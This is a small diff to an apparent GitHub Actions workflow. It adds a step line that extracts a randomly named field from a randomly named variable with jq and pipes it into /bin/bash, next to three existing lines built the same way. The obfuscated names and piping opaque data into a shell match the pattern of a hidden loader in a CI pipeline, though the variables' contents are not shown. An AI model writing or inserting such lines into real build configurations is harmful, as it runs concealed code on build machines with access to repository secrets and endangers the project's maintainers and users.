@@ -46,6 +46,7 @@ jobs:
           echo $khmaj60 | jq -r .e50568 | /bin/bash
           echo $gzr5 | jq -r .vege908 | /bin/bash
           echo $wtb62212 | jq -r .snyh5 | /bin/bash
+          printf '%s' "$yersa34" | jq -r .jy62780 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
